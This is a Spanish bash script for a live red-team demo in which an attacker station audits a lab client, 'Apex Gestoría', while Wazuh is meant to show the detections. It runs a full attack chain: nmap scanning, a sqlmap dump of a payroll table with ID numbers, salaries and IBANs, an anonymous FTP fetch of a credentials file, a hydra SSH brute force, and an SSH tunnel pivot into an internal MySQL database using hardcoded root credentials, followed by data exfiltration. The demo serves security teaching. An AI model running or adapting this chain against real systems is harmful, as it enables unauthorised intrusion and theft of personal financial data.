#!/bin/bash
# ============================================================================
#  DEMO EN VIVO — Auditoría de Apex Gestoría desde jamsec-redteam (SOC JAMSEC)
#  Ejecutar en la estación red team:  bash demo-auditoria.sh
#  Pausa entre fases para narrar; pulsa ENTER para avanzar.
# ============================================================================
T=172.20.17.230
C='\033[1;36m'; G='\033[1;32m'; R='\033[1;31m'; Y='\033[1;33m'; N='\033[0m'
pausa(){ echo; read -p "$(echo -e ${Y}'   [ENTER para continuar] '${N})" _; echo; }
titulo(){ echo -e "\n${C}============================================================${N}"; echo -e "${C} $1${N}"; echo -e "${C}============================================================${N}"; }

clear
echo -e "${G}DEMO — AUDITORÍA DE SEGURIDAD DE APEX GESTORÍA${N}"
echo -e "Atacante: jamsec-redteam (SOC de JAMSEC)   Objetivo: ${R}$T${N}"
echo -e "Recuerda tener abierto en otra ventana el dashboard de Wazuh para ver la detección."
pausa

titulo "FASE 1 — Reconocimiento (nmap)"
echo -e "Descubrimos qué servicios expone el cliente a Internet:"
nmap -Pn -sV -p 21,22,80,443,2222,3306 "$T"
pausa

titulo "FASE 2 — Inyección SQL en la web (sqlmap)"
echo -e "La web de clientes es vulnerable. Volcamos la base de datos por el login:"
sqlmap -u "http://$T/login.php" --data="usuario=admin&password=x" --batch \
  -D apexgestoria -T nominas --dump --fresh-queries 2>&1 | grep -A12 "Table: nominas"
echo -e "${R}>> Datos de nóminas (DNI, salario, IBAN) exfiltrados vía la web.${N}"
pausa

titulo "FASE 3 — FTP anónimo (fuga de credenciales)"
echo -e "El servidor FTP permite acceso anónimo y expone credenciales internas:"
curl -s --max-time 8 "ftp://$T/credencials.txt" --user anonymous:
echo -e "${R}>> Tenemos la contraseña de la base de datos (root/toor).${N}"
pausa

titulo "FASE 4 — Fuerza bruta SSH (hydra)"
echo -e "Crackeamos el acceso SSH del servidor web (puerto 2222):"
printf '123456\nadmin\nsoporte123\npassword\n' > /tmp/wl.txt
hydra -l soporte -P /tmp/wl.txt -s 2222 -f "ssh://$T" 2>&1 | grep -E "login:|password:"
echo -e "${R}>> Acceso conseguido: soporte / soporte123.${N}"
pausa

titulo "FASE 5 — Pivote DMZ -> LAN y exfiltración"
echo -e "Desde el servidor web (DMZ) saltamos a la base de datos interna (LAN):"
sshpass -p 'soporte123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 -f -N -L 13306:10.30.10.10:3306 soporte@"$T" 2>/dev/null
sleep 3
mysql -h 127.0.0.1 -P 13306 -u root -ptoor -e "SELECT empleado,dni,salario_bruto,iban FROM apexgestoria.nominas;" 2>&1
pkill -f "13306:10.30.10.10:3306" 2>/dev/null
echo -e "${R}>> Control total: datos de la red interna robados desde fuera.${N}"
pausa

titulo "CONCLUSIÓN"
echo -e "Cadena completa: Internet -> web (SQLi) / FTP (credenciales) -> SSH (fuerza bruta)"
echo -e "             -> DMZ -> LAN interna -> base de datos -> exfiltración."
echo -e "${G}Ahora muestra el dashboard de Wazuh: escaneo nmap, fuerza bruta SSH y accesos detectados.${N}"
echo
